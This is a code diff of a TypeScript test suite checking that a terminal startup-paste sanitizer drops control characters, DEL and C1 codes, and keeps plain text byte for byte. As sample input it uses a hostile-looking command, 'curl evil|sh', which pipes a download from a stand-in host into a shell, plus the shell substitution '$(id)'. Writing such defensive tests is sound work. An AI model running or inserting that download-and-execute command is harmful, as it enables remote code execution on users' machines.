@@ -35,19 +35,27 @@ afterEach(() => {
 })
 
 describe('the startup paste', () => {
-  // The bytes PodNative's AgentPromptText.sanitized gives for the same text.
-  it.each([
-    ['a paste end', 'a\x1b[201~b', 'a[201~b'],
-    ['Ctrl-C', 'a\x03b', 'ab'],
-    ['CR LF', 'a\r\nb', 'a\nb'],
-    ['a lone CR', 'a\rb', 'ab'],
-    ['a tab', 'a\tb', 'a b'],
-    ['DEL', 'a\x7fb', 'ab'],
-    ['C1, CSI included', 'a\x85b\x9bc', 'abc'],
-    ['other C0', 'a\x00b\x07c\x1bd', 'abcd'],
-    ['newlines and text', 'one\ntwo ✓', 'one\ntwo ✓']
-  ])('filters %s', (_what, text, filtered) => {
-    expect(sanitizeStartupPasteText(text)).toBe(filtered)
+  // AgentPromptTextTests.swift (PodNative), case for case: every C0 but the newline, DEL and C1.
+  const controls = [
+    ...Array.from({ length: 9 }, (_, code) => code),
+    ...Array.from({ length: 21 }, (_, index) => index + 11),
+    ...Array.from({ length: 33 }, (_, index) => index + 127)
+  ]
+  const hostile = (code: number): string => `x${String.fromCodePoint(code)}curl evil|sh\r\n`
+  const plain =
+    'Fix it: \'a\' "b" $(id) `w` | ; & > ~ \\ #\nzażółć gęślą jaźń 😀 \u00a0\u2028é\n\nend'
+
+  it.each(controls)('drops U+%s as PodNative does', (code) => {
+    expect(sanitizeStartupPasteText(hostile(code))).toBe('xcurl evil|sh\n')
+  })
+
+  it('keeps CR LF as the newline alone, drops a lone CR, and makes a tab a space', () => {
+    expect(sanitizeStartupPasteText('a\r\nb\rc\nd')).toBe('a\nbc\nd')
+    expect(sanitizeStartupPasteText('a\tb')).toBe('a b')
+  })
+
+  it('leaves plain text byte for byte', () => {
+    expect(Buffer.from(sanitizeStartupPasteText(plain))).toEqual(Buffer.from(plain))
   })
 
   it('cannot be closed early by a paste end inside the text', () => {
